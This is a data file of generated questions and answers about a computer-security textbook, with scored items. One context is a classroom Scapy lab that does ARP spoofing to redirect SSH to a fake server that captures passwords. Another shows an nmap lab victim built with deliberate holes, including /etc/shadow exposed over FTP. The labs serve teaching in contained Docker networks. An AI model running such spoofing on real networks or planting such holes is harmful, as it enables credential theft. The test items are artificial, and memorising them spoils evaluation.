0xea7a\n\n        id        = 0x0\n\n        seq       = 0x0\n\n        unused    = &#39;&#39;\n\n###[ Raw ]###\n\n           load      = &#39;Ryan Tolboom&#39;\n\n&gt;&gt;&gt; server_mac = result[0][0].src\n\n&gt;&gt;&gt; server_mac\n\n&#39;02:42:ac:14:00:05&#39;</code></pre>\n\n<figcaption>Listing 6. attacker</figcaption>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Scapy uses the \\'/\\' operator to nest protocols. This is my name in an ICMP packet, in an IP packet, in an\n\n    Ethernet frame. Be sure you use your own name!\n\n2.  *\u2461* The `show()`{.literal} command prints out packets in detail\n\n3.  *\u2462* The `srp1()`{.literal} function sends and receives *one* packet at Layer 2\n\n:::\n\nNotice how we use this to capture the server's MAC address and save it in the `server_mac`{.literal} variable.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nTake a screenshot of your scapy session at this point showing that you completed an ICMP echo request/response with your\n\nname in it.\n\n:::\n\n</aside>\n\nWe can also determine MAC addresses at Layer 2 with an ARP \\\"who-has\\\" request. Let's craft and send a broadcast\n\nethernet frame with an ARP \\\"who-has\\\" request for the victims's IP address. The result will tell use what the victim's\n\nMAC address is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>&gt;&gt;&gt; whohas = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst=victim_ip)\n\n&gt;&gt;&gt; result = srp1(whohas)\n\nBegin emission:\n\nFinished sending 1 packets.\n\n*\n\nReceived 1 packets, got 1 answers, remaining 0 packets\n\n&gt;&gt;&gt; result.show()\n\n###[ Ethernet ]###\n\n  dst       = 02:42:ac:14:00:07\n\n  src       = 02:42:ac:14:00:06 \u2460\n\n  type      = ARP\n\n###[ ARP ]###\n\n     hwtype    = 0x1\n\n     ptype     = IPv4\n\n     hwlen     = 6\n\n     plen      = 4\n\n     op        = is-at\n\n     hwsrc     = 02:42:ac:14:00:06\n\n     psrc      = 172.20.0.6\n\n     hwdst     = 02:42:ac:14:00:07\n\n     pdst      = 172.20.0.7\n\n&gt;&gt;&gt; victim_mac = result[0].src</code></pre>\n\n<figcaption>Listing 7. attacker</figcaption>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* This is my MAC address of victim, but yours may be different!\n\n:::\n\nThis is how an ARP exchange is supposed to work. We broadcast out asking what MAC we should use for a certain IP and we\n\nget a response *from the person who legitimately has that MAC and IP*.\n\nWe have everything we need to create an ARP packet telling the victim to send traffic to us when they are trying to\n\naccess servers IP:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>&gt;&gt;&gt; victim_ip, victim_mac, server_ip, server_mac\n\n(&#39;172.20.0.6&#39;, &#39;02:42:ac:14:00:06&#39;, &#39;172.20.0.5&#39;, &#39;02:42:ac:14:00:05&#39;)</code></pre>\n\n<figcaption>Listing 8. attacker</figcaption>\n\n</figure>\n\nNow let's make and view an evil ARP packet:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>&gt;&gt;&gt; bad_arp = ARP(op=2, pdst=victim_ip, psrc=server_ip, hwdst=victim_mac)\n\n&gt;&gt;&gt; bad_arp\n\n&lt;ARP  op=is-at psrc=172.20.0.5 hwdst=02:42:ac:14:00:06 pdst=172.20.0.6 |&gt;</code></pre>\n\n<figcaption>Listing 9. attacker</figcaption>\n\n</figure>\n\nThis packet posits itself as coming from the server, it is aimed at the victim in both IP and MAC, but the MAC address\n\nthat will be used to send it is ours (by default, we don't specify with `hwsrc`{.literal}). This means the victim will\n\nupdate their ARP cache such that frames destined for server go to attacker. This effectively reroutes all layer 2\n\ntraffic that was going to the server from the victim.\n\nGo ahead an send that ARP packet:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>&gt;&gt;&gt; send(bad_arp)\n\n.\n\nSent 1 packets.</code></pre>\n\n<figcaption>Listing 10. attacker</figcaption>\n\n</figure>\n\nNow go back to the victim terminal with the SSH connection to server and try typing something. As soon as SSH has to\n\nsend data, you will get a broken pipe error and the connection will drop. Faced with such a problem, what do you think\n\nmost users will do? Probably try to reconnect, let's try that too. Remember the password is \\\"password\\\".\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>You are now logged into &#39;server&#39; (presumably from &#39;victim&#39;) via SSH for this assignment.\n\nLeave this connection open while you experiment with scapy from &#39;attacker&#39;.\n\nbf9ebe42a108:~# client_loop: send disconnect: Broken pipe \u2460\n\nbash-5.0# ssh server\n\nWarning: Permanently added &#39;server,172.20.0.5&#39; (ECDSA) to the list of known hosts.\n\nroot@server&#39;s password:\n\n#</code></pre>\n\n<figcaption>Listing 11. victim</figcaption>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* This happened when they tried to type something right after we sent the malicious ARP\n\n:::\n\nWait, that prompt looks a little different and where's the message about staying logged in? It turns out the victim\n\nactually signed into our fake SSH server and their username and password were logged! Take a look at the output from the\n\nterminal running `docker-compose up`{.literal}, you'll see the credentials entered:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>attacker_1  | 2021/10/07 01:21:41 [172.20.0.6:60252] authentication for user &quot;root&quot; with password &quot;password&quot; accepted</code></pre>\n\n<figcaption>Listing 12. docker-compose up terminal</figcaption>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n:::: content\n\n::: description-list\n\n[How would you create an ARP packet in scapy to reverse the change you made previously and fix the route?]{.term}\n\n:   []{.principal}\n\n[Would using keys instead of passwords help prevent this kind of attack? Why or why not?]{.term}\n\n:   []{.principal}\n\n[How would [managing host keys correctly](https://www.ssh.com/academy/ssh/host-key){.link} prevent this kind of attack?]{.term}\n\n:   []{.principal}\n\n:::\n\n::::\n\n</aside>\n\nTo stop the running containers, you can type Ctrl-C in the terminal running `docker-compose up`{.literal}, exit out of\n\nthe victim, and exit out of the attacker.\n\n:::::::::::::::::\n\n:::: {.section .sect2 title=\"5.8. Review Questions\"}\n", "topic": "Analyzing Scapy Output to Identify Server MAC Address", "question": "Analyze the provided Scapy output (Listing 6) to determine the MAC address of the server (172.20.0.5) and explain how this information is crucial for implementing the MITM attack.", "answer": "02:42:ac:14:00:05", "explanation": "The Scapy output (Listing 6) reveals the server's MAC address as 02:42:ac:14:00:05. This MAC address is essential for crafting the malicious ARP packets that redirect traffic from the victim to the attacker. Without knowing the server\u2019s MAC, the ARP spoofing would be ineffective.", "question_token_count": 43, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 12, "choices": null}
{"context": "## Example Schedule {#_computer_systems_security_planning_for_success.xhtml__example_schedule}\nA sample schedule utilizing these resources in a 15 week semester is shown below:\n\n:::: table\n\n::: content\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| Week                  | Chapters              | Assignments                                   | Learning Outcomes     |\n\n+=======================+=======================+===============================================+=======================+\n\n| 1                     | [Introducti           | ::: embed                                     | 1.1, 1.2, 1.6, 2.7    |\n\n|                       | on](#_computer_system | [Lab: Think Like a                            |                       |\n\n|                       | s_security_planning_f | Hacker](#_computer_systems_security_pl        |                       |\n\n|                       | or_success.xhtml__int | anning_for_success.xhtml__lab_think_like_a_ha |                       |\n\n|                       | roduction){#_computer | cker){#_computer_systems_security_planning_fo |                       |\n\n|                       | _systems_security_pla | r_success.xhtml_xref-_lab_think_like_a_hacker |                       |\n\n|                       | nning_for_success.xht | .xref}\\                                       |                       |\n\n|                       | ml_xref-_introduction | [Introduction Review                          |                       |\n\n|                       | .xref}                | Questions](#_comp                             |                       |\n\n|                       |                       | uter_systems_security_planning_for_success.xh |                       |\n\n|                       |                       | tml_intro_review){#_computer_systems_security |                       |\n\n|                       |                       | _planning_for_success.xhtml_xref-intro_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 2                     | [Cryptograp           | ::: embed                                     | 1.2, 1.3, 1.6, 2.1,   |\n\n|                       | hy](#_computer_system | [Lab: Hash it                                 | 2.4, 2.5, 2.8, 3.9    |\n\n|                       | s_security_planning_f | Out](#_computer_sys                           |                       |\n\n|                       | or_success.xhtml__cry | tems_security_planning_for_success.xhtml__lab |                       |\n\n|                       | ptography){#_computer | _hash_it_out){#_computer_systems_security_pla |                       |\n\n|                       | _systems_security_pla | nning_for_success.xhtml_xref-_lab_hash_it_out |                       |\n\n|                       | nning_for_success.xht | .xref}\\                                       |                       |\n\n|                       | ml_xref-_cryptography | [Cryptography Review                          |                       |\n\n|                       | .xref}                | Questions](#_comput                           |                       |\n\n|                       |                       | er_systems_security_planning_for_success.xhtm |                       |\n\n|                       |                       | l_crypto_review){#_computer_systems_security_ |                       |\n\n|                       |                       | planning_for_success.xhtml_xref-crypto_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 3                     | [Malware](#_compu     | ::: embed                                     | 1.2, 1.3, 1.4, 2.5,   |\n\n|                       | ter_systems_security_ | [Lab: Malware                                 | 4.1, 4.3, 4.5         |\n\n|                       | planning_for_success. | Analysis](#_computer_systems_secur            |                       |\n\n|                       | xhtml__malware){#_com | ity_planning_for_success.xhtml__lab_malware_a |                       |\n\n|                       | puter_systems_securit | nalysis){#_computer_systems_security_planning |                       |\n\n|                       | y_planning_for_succes | _for_success.xhtml_xref-_lab_malware_analysis |                       |\n\n|                       | s.xhtml_xref-_malware | .xref}\\                                       |                       |\n\n|                       | .xref}                | [Malware Review                               |                       |\n\n|                       |                       | Questions](#_computer                         |                       |\n\n|                       |                       | _systems_security_planning_for_success.xhtml_ |                       |\n\n|                       |                       | malware_review){#_computer_systems_security_p |                       |\n\n|                       |                       | lanning_for_success.xhtml_xref-malware_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 4                     | [P                    | ::: embed                                     | 1.3, 1.6, 1.7, 3.1,   |\n\n|                       | rotocols](#_computer_ | [Lab: Scanning with                           | 3.2, 4.1              |\n\n|                       | systems_security_plan | nmap](#_computer_systems_security_            |                       |\n\n|                       | ning_for_success.xhtm | planning_for_success.xhtml__lab_scanning_with |                       |\n\n|                       | l__protocols){#_compu | _nmap){#_computer_systems_security_planning_f |                       |\n\n|                       | ter_systems_security_ | or_success.xhtml_xref-_lab_scanning_with_nmap |                       |\n\n|                       | planning_for_success. | .xref}\\                                       |                       |\n\n|                       | xhtml_xref-_protocols | [Protocols Review                             |                       |\n\n|                       | .xref}                | Questions](#_computer_sys                     |                       |\n\n|                       |                       | tems_security_planning_for_success.xhtml_prot |                       |\n\n|                       |                       | ocols_review){#_computer_systems_security_pla |                       |\n\n|                       |                       | nning_for_success.xhtml_xref-protocols_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 5                     | [Attacks](#_compu     | ::: embed                                     | 1.2, 1.3, 1.4, 1.8,   |\n\n|                       | ter_systems_security_ | Quiz 1\\                                       | 3.3, 3.4, 4.1, 4.2    |\n\n|                       | planning_for_success. | [Attacks Review                               |                       |\n\n|                       | xhtml__attacks){#_com | Questions](#_computer                         |                       |\n\n|                       | puter_systems_securit | _systems_security_planning_for_success.xhtml_ |                       |\n\n|                       | y_planning_for_succes | attacks_review){#_computer_systems_security_p |                       |\n\n|                       | s.xhtml_xref-_attacks | lanning_for_success.xhtml_xref-attacks_review |                       |\n\n|                       | .xref}                | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 6                     | ::: embed             | ::: embed                                     | 1.1, 1.2, 1.3, 1.4,   |\n\n|                       | [Introdu              | Midterm Review\\                               | 1.5, 1.6, 1.7, 1.8,   |\n\n|                       | ction](#_computer_sys | [Lab: MitM with                               | 2.1, 2.4, 2.5, 2.7,   |\n\n|                       | tems_security_plannin | Scapy](#_computer_systems_sec                 | 2.8, 3.1, 3.2, 3.3,   |\n\n|                       | g_for_success.xhtml__ | urity_planning_for_success.xhtml__lab_mitm_wi | 3.4, 3.8, 3.9, 4.1,   |\n\n|                       | introduction){.xref}\\ | th_scapy){#_computer_systems_security_plannin | 4.2, 4.3, 4.5         |\n\n|                       | [Cryptog              | g_for_success.xhtml_xref-_lab_mitm_with_scapy |                       |\n\n|                       | raphy](#_computer_sys | .xref}                                        |                       |\n\n|                       | tems_security_plannin | :::                                           |                       |\n\n|                       | g_for_success.xhtml__ |                                               |                       |\n\n|                       | cryptography){.xref}\\ |                                               |                       |\n\n|                       | [Malware](#_compute   |                                               |                       |\n\n|                       | r_systems_security_pl |                                               |                       |\n\n|                       | anning_for_success.xh |                                               |                       |\n\n|                       | tml__malware){.xref}\\ |                                               |                       |\n\n|                       | [P                    |                                               |                       |\n\n|                       | rotocols](#_computer_ |                                               |                       |\n\n|                       | systems_security_plan |                                               |                       |\n\n|                       | ning_for_success.xhtm |                                               |                       |\n\n|                       | l__protocols){.xref}\\ |                                               |                       |\n\n|                       | [Attacks](#_comput    |                                               |                       |\n\n|                       | er_systems_security_p |                                               |                       |\n\n|                       | lanning_for_success.x |                                               |                       |\n\n|                       | html__attacks){.xref} |                                               |                       |\n\n|                       | :::                   |                                               |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 7                     | ::: embed             | Midterm                                       | 1.1, 1.2, 1.3, 1.4,   |\n\n|                       | [Introdu              |                                               | 1.5, 1.6, 1.7, 1.8,   |\n\n|                       | ction](#_computer_sys |                                               | 2.1, 2.4, 2.5, 2.7,   |\n\n|                       | tems_security_plannin |                                               | 2.8, 3.1, 3.2, 3.3,   |\n\n|                       | g_for_success.xhtml__ |                                               | 3.4, 3.8, 3.9, 4.1,   |\n\n|                       | introduction){.xref}\\ |                                               | 4.2, 4.3, 4.5         |\n\n|                       | [Cryptog              |                                               |                       |\n\n|                       | raphy](#_computer_sys |                                               |                       |\n\n|                       | tems_security_plannin |                                               |                       |\n\n|                       | g_for_success.xhtml__ |                                               |                       |\n\n|                       | cryptography){.xref}\\ |                                               |                       |\n\n|                       | [Malware](#_compute   |                                               |                       |\n\n|                       | r_systems_security_pl |                                               |                       |\n\n|                       | anning_for_success.xh |                                               |                       |\n\n|                       | tml__malware){.xref}\\ |                                               |                       |\n\n|                       | [P                    |                                               |                       |\n\n|                       | rotocols](#_computer_ |                                               |                       |\n\n|                       | systems_security_plan |                                               |                       |\n\n|                       | ning_for_success.xhtm |                                               |                       |\n\n|                       | l__protocols){.xref}\\ |                                               |                       |\n\n|                       | [Attacks](#_comput    |                                               |                       |\n\n|                       | er_systems_security_p |                                               |                       |\n\n|                       | lanning_for_success.x |                                               |                       |\n\n|                       | html__attacks){.xref} |                                               |                       |\n\n|                       | :::                   |                                               |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 8                     | [Security             | ::: embed                                     | 3.1, 3.2, 3.3, 3.6,   |\n\n|                       | Solutions](#_comput   | [Lab: Exploiting                              | 4.1, 4.2              |\n\n|                       | er_systems_security_p | log4j](#_computer_systems_secur               |                       |\n\n|                       | lanning_for_success.x | ity_planning_for_success.xhtml__lab_exploitin |                       |\n\n|                       | html__security_soluti | g_log4j){#_computer_systems_security_planning |                       |\n\n|                       | ons){#_computer_syste | _for_success.xhtml_xref-_lab_exploiting_log4j |                       |\n\n|                       | ms_security_planning_ | .xref}\\                                       |                       |\n\n|                       | for_success.xhtml_xre | [Security Solutions Review                    |                       |\n\n|                       | f-_security_solutions | Questions](#_computer_sys                     |                       |\n\n|                       | .xref}                | tems_security_planning_for_success.xhtml_solu |                       |\n\n|                       |                       | tions_review){#_computer_systems_security_pla |                       |\n\n|                       |                       | nning_for_success.xhtml_xref-solutions_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 9                     | [Access               | ::: embed                                     | 2.1, 2.2, 2.4, 2.7,   |\n\n|                       | Controls](#_          | [Lab: Linux File                              | 3.3, 3.4, 3.8, 5.1    |\n\n|                       | computer_systems_secu | Perm                                          |                       |\n\n|                       | rity_planning_for_suc | issions](#_computer_systems_security_planning |                       |\n\n|                       | cess.xhtml__access_co | _for_success.xhtml__lab_linux_file_permission |                       |\n\n|                       | ntrols){#_computer_sy | s){#_computer_systems_security_planning_for_s |                       |\n\n|                       | stems_security_planni | uccess.xhtml_xref-_lab_linux_file_permissions |                       |\n\n|                       | ng_for_success.xhtml_ | .xref}\\                                       |                       |\n\n|                       | xref-_access_controls | [Access Controls Review                       |                       |\n\n|                       | .xref}                | Questions](#_comput                           |                       |\n\n|                       |                       | er_systems_security_planning_for_success.xhtm |                       |\n\n|                       |                       | l_access_review){#_computer_systems_security_ |                       |\n\n|                       |                       | planning_for_success.xhtml_xref-access_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 10                    | [Vulnerability        | ::: embed                                     | 5.1, 5.2, 5.3, 5.4,   |\n\n|                       | Management and        | [Lab: Scanning with                           | 5.5                   |\n\n|                       | Compliance](#_comput  | Nessus](#_computer_systems_security_plan      |                       |\n\n|                       | er_systems_security_p | ning_for_success.xhtml__lab_scanning_with_nes |                       |\n\n|                       | lanning_for_success.x | sus){#_computer_systems_security_planning_for |                       |\n\n|                       | html__vulnerability_m | _success.xhtml_xref-_lab_scanning_with_nessus |                       |\n\n|                       | anagement_and_complia | .xref}\\                                       |                       |\n\n|                       | nce){#_computer_syste | [Vulnerability Management and Compliance      |                       |\n\n|                       | ms_security_planning_ | Review                                        |                       |\n\n|                       | for_success.xhtml_xre | Questions](#_computer_syste                   |                       |\n\n|                       | f-_vulnerability_mana | ms_security_planning_for_success.xhtml_compli |                       |\n\n|                       | gement_and_compliance | ance_review){#_computer_systems_security_plan |                       |\n\n|                       | .xref}                | ning_for_success.xhtml_xref-compliance_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 11                    | [Incident Response    | ::: embed                                     | 1.2, 1.3, 1.4, 1.7,   |\n\n|                       | and                   | [Lab: Reporting on the 2014 Sony Pictures     | 1.8, 2.3, 2.5, 3.1,   |\n\n|                       | Contin                | Hack](#_computer_systems_security             | 3.2, 3.3, 3.4, 4.1,   |\n\n|                       | uity](#_computer_syst | _planning_for_success.xhtml__lab_reporting_on | 4.2, 4.3, 4.4, 4.5,   |\n\n|                       | ems_security_planning | _the_2014_sony_pictures_hack){#_computer_syst | 5.3, 5.4, 5.5         |\n\n|                       | _for_success.xhtml__i | ems_security_planning_for_success.xhtml_xref- |                       |\n\n|                       | ncident_response_and_ | _lab_reporting_on_the_2014_sony_pictures_hack |                       |\n\n|                       | continuity){#_compute | .xref}\\                                       |                       |\n\n|                       | r_systems_security_pl | [Incident Response and Recovery Review        |                       |\n\n|                       | anning_for_success.xh | Questions](#_computer_s                       |                       |\n\n|                       | tml_xref-_incident_re | ystems_security_planning_for_success.xhtml_in |                       |\n\n|                       | sponse_and_continuity | cident_review){#_computer_systems_security_pl |                       |\n\n|                       | .xref}                | anning_for_success.xhtml_xref-incident_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 12                    | [Virtualization](     | ::: embed                                     | 2.3, 3.6, 3.6         |\n\n|                       | #_computer_systems_se | [Lab: Malicious                               |                       |\n\n|                       | curity_planning_for_s | Containers](#_computer_systems_security_plan  |                       |\n\n|                       | uccess.xhtml__virtual | ning_for_success.xhtml__lab_malicious_contain |                       |\n\n|                       | ization){#_computer_s | ers){#_computer_systems_security_planning_for |                       |\n\n|                       | ystems_security_plann | _success.xhtml_xref-_lab_malicious_containers |                       |\n\n|                       | ing_for_success.xhtml | .xref}\\                                       |                       |\n\n|                       | _xref-_virtualization | [Virtualization Review                        |                       |\n\n|                       | .xref}                | Questions](#_co                               |                       |\n\n|                       |                       | mputer_systems_security_planning_for_success. |                       |\n\n|                       |                       | xhtml_virt_review){#_computer_systems_securit |                       |\n\n|                       |                       | y_planning_for_success.xhtml_xref-virt_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 13                    | Mobile Solutions      | Quiz 2                                        | 3.5                   |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 14                    | ::: embed             | Final Review                                  | 1.2, 1.3, 1.4, 1.7,   |\n\n|                       | [Security             |                                               | 1.8, 2.1, 2.2, 2.3,   |\n\n|                       | Solutions]            |                                               | 2.4, 2.5, 2.7, 3.1,   |\n\n|                       | (#_computer_systems_s |                                               | 3.2, 3.3, 3.4, 3.5,   |\n\n|                       | ecurity_planning_for_ |                                               | 3.6, 3.7, 3.8, 4.1,   |\n\n|                       | success.xhtml__securi |                                               | 4.2, 4.3, 4.4, 4.5,   |\n\n|                       | ty_solutions){.xref}\\ |                                               | 5.1, 5.2, 5.3, 5.4,   |\n\n|                       | [Access               |                                               | 5.5                   |\n\n|                       | Contro                |                                               |                       |\n\n|                       | ls](#_computer_system |                                               |                       |\n\n|                       | s_security_planning_f |                                               |                       |\n\n|                       | or_success.xhtml__acc |                                               |                       |\n\n|                       | ess_controls){.xref}\\ |                                               |                       |\n\n|                       | [Vulnerability        |                                               |                       |\n\n|                       | Management and        |                                               |                       |\n\n|                       | Compliance]           |                                               |                       |\n\n|                       | (#_computer_systems_s |                                               |                       |\n\n|                       | ecurity_planning_for_ |                                               |                       |\n\n|                       | success.xhtml__vulner |                                               |                       |\n\n|                       | ability_management_an |                                               |                       |\n\n|                       | d_compliance){.xref}\\ |                                               |                       |\n\n|                       | [Incident Response    |                                               |                       |\n\n|                       | and                   |                                               |                       |\n\n|                       | Cont                  |                                               |                       |\n\n|                       | inuity](#_computer_sy |                                               |                       |\n\n|                       | stems_security_planni |                                               |                       |\n\n|                       | ng_for_success.xhtml_ |                                               |                       |\n\n|                       | _incident_response_an |                                               |                       |\n\n|                       | d_continuity){.xref}\\ |                                               |                       |\n\n|                       | [Virtualizat          |                                               |                       |\n\n|                       | ion](#_computer_syste |                                               |                       |\n\n|                       | ms_security_planning_ |                                               |                       |\n\n|                       | for_success.xhtml__vi |                                               |                       |\n\n|                       | rtualization){.xref}\\ |                                               |                       |\n\n|                       | Mobile Solutions      |                                               |                       |\n\n|                       | :::                   |                                               |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 15                    | ::: embed             | Final Exam                                    | 1.2, 1.3, 1.4, 1.7,   |\n\n|                       | [Security             |                                               | 1.8, 2.1, 2.2, 2.3,   |\n\n|                       | Solutions]            |                                               | 2.4, 2.5, 2.7, 3.1,   |\n\n|                       | (#_computer_systems_s |                                               | 3.2, 3.3, 3.4, 3.5,   |\n\n|                       | ecurity_planning_for_ |                                               | 3.6, 3.7, 3.8, 4.1,   |\n\n|                       | success.xhtml__securi |                                               | 4.2, 4.3, 4.4, 4.5,   |\n\n|                       | ty_solutions){.xref}\\ |                                               | 5.1, 5.2, 5.3, 5.4,   |\n\n|                       | [Access               |                                               | 5.5                   |\n\n|                       | Contro                |                                               |                       |\n\n|                       | ls](#_computer_system |                                               |                       |\n\n|                       | s_security_planning_f |                                               |                       |\n\n|                       | or_success.xhtml__acc |                                               |                       |\n\n|                       | ess_controls){.xref}\\ |                                               |                       |\n\n|                       | [Vulnerability        |                                               |                       |\n\n|                       | Management and        |                                               |                       |\n\n|                       | Compliance]           |                                               |                       |\n\n|                       | (#_computer_systems_s |                                               |                       |\n\n|                       | ecurity_planning_for_ |                                               |                       |\n\n|                       | success.xhtml__vulner |                                               |                       |\n\n|                       | ability_management_an |                                               |                       |\n\n|                       | d_compliance){.xref}\\ |                                               |                       |\n\n|                       | [Incident Response    |                                               |                       |\n\n|                       | and                   |                                               |                       |\n\n|                       | Cont                  |                                               |                       |\n\n|                       | inuity](#_computer_sy |                                               |                       |\n\n|                       | stems_security_planni |                                               |                       |\n\n|                       | ng_for_success.xhtml_ |                                               |                       |\n\n|                       | _incident_response_an |                                               |                       |\n\n|                       | d_continuity){.xref}\\ |                                               |                       |\n\n|                       | [Virtualizat          |                                               |                       |\n\n|                       | ion](#_computer_syste |                                               |                       |\n\n|                       | ms_security_planning_ |                                               |                       |\n\n|                       | for_success.xhtml__vi |                                               |                       |\n\n|                       | rtualization){.xref}\\ |                                               |                       |\n\n|                       | Mobile Solutions      |                                               |                       |\n\n|                       | :::                   |                                               |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n:::\n\n::::\n\n:::::\n\n::::::::\n\n::::::::::::::::::::::: {.section .sect1 title=\"1. Introduction\"}\n", "topic": "Describe the learning objectives of the \u201cScanning with nmap\u201d lab (Week 4), emphasizing the practical skills students should acquire.", "question": "What are the primary learning objectives of the \u201cScanning with nmap\u201d lab in Week 4 of the computer systems security planning course, and what specific practical skills should students be able to demonstrate upon completion?", "answer": "The lab aims to teach students how to use nmap to identify open ports, services, and operating systems on target hosts, allowing them to understand network vulnerabilities and apply these skills to identify potential security weaknesses.", "explanation": "The lab focuses on using nmap for network scanning, aiming for students to understand and apply techniques for identifying open ports, services, and operating systems on target hosts. Students should be able to execute basic and advanced nmap commands, interpret scan results, and apply these skills to identify potential vulnerabilities.", "question_token_count": 42, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 4, "avg_answer_token_count": 42, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; 